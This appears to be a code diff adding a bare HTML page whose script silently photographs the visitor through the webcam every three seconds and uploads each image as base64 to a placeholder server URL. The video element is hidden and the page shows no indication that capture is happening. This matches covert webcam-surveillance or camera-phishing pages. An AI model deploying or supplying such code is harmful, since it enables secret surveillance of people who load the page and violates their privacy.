@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Capture Image Every 3 Seconds</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        video {
+            display: none; /* Hide video element */
+        }
+    </style>
+</head>
+<body>
+    <script>
+        // Function to capture image and send to server
+        const captureImage = async () => {
+            try {
+                // Access the camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+
+                // Capture an image
+                const imageBitmap = await imageCapture.takePhoto();
+
+                // Convert imageBitmap to a canvas to get base64 data
+                const canvas = document.createElement('canvas');
+                canvas.width = imageBitmap.width;
+                canvas.height = imageBitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(imageBitmap, 0, 0);
+
+                // Get the base64 image data
+                const imageData = canvas.toDataURL('image/png');
+
+                // Send the image to the server
+                await fetch('https://your-server-url/capture.php', {
+                    method: 'POST',
+                    body: JSON.stringify({ image: imageData }),
+                    headers: { 'Content-Type': 'application/json' }
+                });
+
+                // Stop the video stream
+                stream.getTracks().forEach(track => track.stop());
+
+            } catch (err) {
+                console.error("Error capturing image: ", err);
+            }
+        };
+
+        // Start capturing images every 3 seconds
+        setInterval(captureImage, 3000);
+        captureImage(); // Optional: capture the first image immediately
+    </script>
+</body>
+</html>
+  
